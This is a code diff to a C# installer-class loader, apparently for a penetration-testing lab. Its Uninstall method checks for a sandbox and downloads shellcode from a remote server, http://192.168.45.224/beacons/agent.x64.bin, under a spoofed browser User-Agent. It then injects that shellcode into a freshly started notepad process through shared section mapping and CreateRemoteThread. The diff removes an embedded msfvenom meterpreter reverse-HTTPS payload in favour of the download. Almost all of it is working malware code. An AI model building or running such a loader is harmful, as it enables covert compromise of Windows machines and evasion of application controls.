@@ -2,6 +2,8 @@
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Configuration.Install;
+using System.Net.Http;
+using System.Threading.Tasks;
 
 namespace Shell
 {
@@ -18,6 +20,7 @@ namespace Shell
     {
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
@@ -55,6 +58,40 @@ namespace Shell
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern UInt32 FlsAlloc(IntPtr lpCallback);
+
+        // Method to download shellcode from a URL
+        private static async Task<byte[]> DownloadShellcodeAsync(string url)
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                // Set a timeout to avoid hanging
+                client.Timeout = TimeSpan.FromSeconds(30);
+
+                // Add a user agent to look like a normal browser request
+                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+
+                try
+                {
+                    // Download the raw bytes
+                    byte[] shellcode = await client.GetByteArrayAsync(url);
+                    return shellcode;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Failed to download shellcode: {ex.Message}");
+                    return null;
+                }
+            }
+        }
+
+        // Synchronous wrapper for the async download method
+        private byte[] DownloadShellcode(string url)
+        {
+            Task<byte[]> downloadTask = DownloadShellcodeAsync(url);
+            downloadTask.Wait();
+            return downloadTask.Result;
+        }
+
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
             UInt32 result = FlsAlloc(IntPtr.Zero);
@@ -72,22 +109,40 @@ namespace Shell
                 return;
             }
 
+            // URL where the raw shellcode is hosted
+            // The shellcode should be served as raw bytes (e.g., from a web server)
+            string shellcodeUrl = "http://192.168.45.224:80/beacons/agent.x64.bin";
+
+            // Download the shellcode
+            byte[] buf = DownloadShellcode(shellcodeUrl);
+
+            // Check if download was successful
+            if (buf == null || buf.Length == 0)
+            {
+                return;
+            }
+
             Process.Start("notepad.exe");
 
             Process[] expProc = Process.GetProcessesByName("notepad");
+            if (expProc.Length == 0)
+            {
+                return;
+            }
+
             int pid = expProc[0].Id;
 
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
-
-            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.xx.xx LPORT=443 -f csharp
-            byte[] buf = new byte[671] { 0xfc, 0x48, ..., 0xff, 0xd5 };
+            if (hProcess == IntPtr.Zero)
+            {
+                return;
+            }
 
             IntPtr s = IntPtr.Zero;
             IntPtr ba1 = IntPtr.Zero;
             IntPtr ba2 = IntPtr.Zero;
 
             uint vs = 0;
-
             ulong li = (ulong)buf.Length;
 
             uint SECTION_ALL_ACCESS = 0xF001F;
@@ -96,19 +151,32 @@ namespace Shell
             ulong sectionOffset = 0;
 
             uint res = NtCreateSection(ref s, SECTION_ALL_ACCESS, IntPtr.Zero, ref li, 0x40, SEC_COMMIT, IntPtr.Zero);
+            if (res != 0)
+            {
+                return;
+            }
 
             res = NtMapViewOfSection(s, GetCurrentProcess(), ref ba1, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out vs, ViewShare, 0, 0x40);
+            if (res != 0)
+            {
+                NtClose(s);
+                return;
+            }
 
             res = NtMapViewOfSection(s, hProcess, ref ba2, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out vs, ViewShare, 0, 0x40);
+            if (res != 0)
+            {
+                NtUnmapViewOfSection(GetCurrentProcess(), ba1);
+                NtClose(s);
+                return;
+            }
 
             Marshal.Copy(buf, 0, ba1, buf.Length);
 
             res = NtUnmapViewOfSection(GetCurrentProcess(), ba1);
-
             res = NtClose(s);
 
             IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, ba2, IntPtr.Zero, 0, IntPtr.Zero);
         }
     }
-
 }
